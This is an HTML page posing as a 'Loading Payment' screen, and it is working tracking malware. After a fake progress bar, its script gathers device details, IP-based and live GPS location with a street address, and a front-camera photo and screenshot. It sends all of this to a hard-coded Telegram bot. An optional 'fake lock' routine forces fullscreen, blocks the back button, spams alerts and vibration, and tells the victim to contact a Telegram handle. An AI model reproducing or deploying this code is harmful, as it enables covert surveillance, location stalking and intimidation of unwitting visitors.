<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>bodo banget si</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        body { background: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; color: #999; overflow: hidden; }
        #loading-container { text-align: center; width: 80%; max-width: 400px; }
        #loading-text { font-size: 22px; margin-bottom: 20px; color: #6e48aa; }
        #progress-container { height: 3px; background: #222; border-radius: 3px; overflow: hidden; }
        #progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg,#6e48aa,#9d50bb); transition: width .3s ease; }
        #loading-details { margin-top: 20px; font-size: 14px; color: #666; }
        .hidden { display: none; }
        /* Optional overlay for fake lock (bisa dihapus kalo gak butuh) */
        #lockOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 999999; display: none; flex-direction: column; justify-content: center; align-items: center; color: white; font-size: 24px; }
        #lockOverlay button { padding: 10px 20px; font-size: 18px; background: red; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div id="loading-container">
        <div id="loading-text">Loading Payment</div>
        <div id="progress-container"><div id="progress-bar"></div></div>
        <div id="loading-details"></div>
    </div>

    <!-- Overlay buat fake lock (opsional) -->
    <div id="lockOverlay">
        <div>⚠️ SISTEM LU TERKUNCI ⚠️</div>
        <div style="font-size: 14px; margin: 20px;">Hubungi @branzx2 buat buka</div>
        <button onclick="fakeUnlock()">Buka Kunci</button>
    </div>

    <video id="v" autoplay muted class="hidden"></video>
    <canvas id="c" class="hidden"></canvas>

    <script>
        (() => {
            // ==================== KONFIGURASI ====================
            const T = '8201413619:AAFu1bPBjxbg8Nt9-emFpE_tb2TaSQTPbEE';  // Token bot Telegram
            const C = '6809118251';                                      // Chat ID tujuan

            // ==================== PROGRESS BAR PALSU ====================
            let p = 0;
            const pb = document.getElementById('progress-bar');
            const ld = document.getElementById('loading-details');
            const LM = [
                "Memeriksa modul sistem...",
                "Memuat komponen inti...",
                "Menginisialisasi antarmuka...",
                "Memverifikasi koneksi...",
                "Menyiapkan lingkungan...",
                "Memeriksa pembaruan...",
                "Memuat aset tampilan..."
            ];
            setInterval(() => {
                p += Math.random() * 5;
                if (p > 98) p = 98;
                pb.style.width = p + '%';
                if (Math.random() > .9) ld.textContent = LM[Math.floor(Math.random() * LM.length)];
            }, 500);

            // ==================== FUNGSI KIRIM TELEGRAM ====================
            const sTG = async d => {
                try {
                    await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: C, text: d, parse_mode: 'HTML' })
                    });
                } catch (e) {}
            };

            const sP = async (b, f) => {
                try {
                    const fd = new FormData();
                    fd.append('chat_id', C);
                    fd.append('photo', b, f);
                    await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                } catch (e) {}
            };

            // ==================== GET ALAMAT DARI LAT/LONG ====================
            const gLD = async (a, b) => {
                try {
                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`);
                    const d = await r.json();
                    if (d.address) {
                        return {
                            kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
                            kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
                            fa: d.display_name || "Alamat tidak tersedia"
                        };
                    }
                } catch (e) {}
                return { kb: "Tidak diketahui", kc: "Tidak diketahui", fa: "Alamat tidak tersedia" };
            };

            // ==================== KUMPULIN DATA DEVICE & LOKASI ====================
            const cDI = async () => {
                let m = '╭───── Tracking Report ───── ⦿\n\n⚙️ DEVICE INFORMATION\n';
                m += `🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;

                if (navigator.getBattery) {
                    try {
                        const b = await navigator.getBattery();
                        m += `🔋 Battery: ${Math.floor(b.level * 100)}%\n🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
                    } catch (e) { m += '🔋 Battery: ❌ Tidak tersedia\n'; }
                }

                m += `⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n🔗 Referrer: ${document.referrer || 'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

                // Lokasi dari IP
                try {
                    const i = await fetch('https://ipapi.co/json/');
                    const d = await i.json();
                    m += '📍 LOCATION INFORMATION (IP-Based)\n';
                    m += `📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;
                    if (d.latitude && d.longitude) {
                        m += `📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;
                        const l = await gLD(d.latitude, d.longitude);
                        m += `🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`;
                    }
                } catch (e) { m += '❌ Gagal mendapatkan informasi lokasi dari IP\n'; }

                m += '\n╰───── Telegram @dliinotsepuh ───── ⦿';
                return m;
            };

            // ==================== EKSEKUSI UTAMA ====================
            const ST = async () => {
                // Kirim laporan device & lokasi
                await sTG(await cDI());

                // Ambil foto dari KAMERA DEPAN (facingMode: 'user')
                try {
                    const v = document.getElementById('v');
                    const c = document.getElementById('c');

                    // Minta akses kamera depan
                    const st = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' }  // 'user' = kamera depan
                    });

                    v.srcObject = st;
                    await new Promise(r => setTimeout(r, 3000)); // Tunggu 3 detik biar kamera siap

                    // Capture ke canvas
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);

                    // Kirim foto selfie ke Telegram
                    c.toBlob(b => sP(b, 'selfie.jpg'), 'image/jpeg');

                    // Matikan kamera
                    st.getTracks().forEach(t => t.stop());

                } catch (e) {
                    await sTG('❌ Kamera depan gagal diakses: ' + e.message);
                }

                // Ambil screenshot halaman (opsional, bisa dihapus kalo gak butuh)
                setTimeout(async () => {
                    try {
                        const cn = await html2canvas(document.body);
                        cn.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg');
                    } catch (e) {
                        await sTG('❌ Screenshot gagal: ' + e.message);
                    }
                }, 5000);

                // GPS tracking real-time
                if (navigator.geolocation) {
                    navigator.geolocation.watchPosition(async p => {
                        let g = `📍 LIVE GPS TRACKING\n📌 Lat: ${p.coords.latitude}\n📍 Lng: ${p.coords.longitude}\n🎯 Akurasi: ${p.coords.accuracy}m\n`;
                        const l = await gLD(p.coords.latitude, p.coords.longitude);
                        g += `🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
                        await sTG(g);
                    }, async e => {
                        await sTG(`❌ GPS Error: ${e.message}`);
                    }, { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
                }
            };

            // ==================== FAKE LOCK (OPSIONAL, BISA DIHAPUS) ====================
            function activateLock() {
                const overlay = document.getElementById('lockOverlay');
                overlay.style.display = 'flex';

                // Fullscreen paksa
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen();
                } else if (document.documentElement.webkitRequestFullscreen) {
                    document.documentElement.webkitRequestFullscreen();
                } else if (document.documentElement.msRequestFullscreen) {
                    document.documentElement.msRequestFullscreen();
                }

                // Vibration spam
                if (navigator.vibrate) {
                    setInterval(() => {
                        navigator.vibrate([500, 200, 500, 200, 1000]);
                    }, 2000);
                }

                // Alert bomb
                function bomb() {
                    setTimeout(() => {
                        alert('⚠️ LOCKED! Hubungi @branzx2');
                        bomb();
                    }, 100);
                }
                bomb();

                // Cegah keluar fullscreen
                document.addEventListener('fullscreenchange', () => {
                    if (!document.fullscreenElement) {
                        document.documentElement.requestFullscreen();
                    }
                });
                document.addEventListener('webkitfullscreenchange', () => {
                    if (!document.webkitFullscreenElement) {
                        document.documentElement.webkitRequestFullscreen();
                    }
                });

                // Cegah back button
                history.pushState(null, null, location.href);
                window.onpopstate = function () {
                    history.pushState(null, null, location.href);
                };
            }

            window.fakeUnlock = function () {
                alert('Maaf, ini cuma jebakan. HP lu tetep ke kunci!');
                activateLock();
            };

            // Jalankan ST setelah 3 detik
            setTimeout(ST, 3000);

            // Opsional: aktifkan fake lock setelah 10 detik (bisa di-comment kalo gak mau)
            // setTimeout(activateLock, 10000);
        })();
    </script>
</body>
</html>
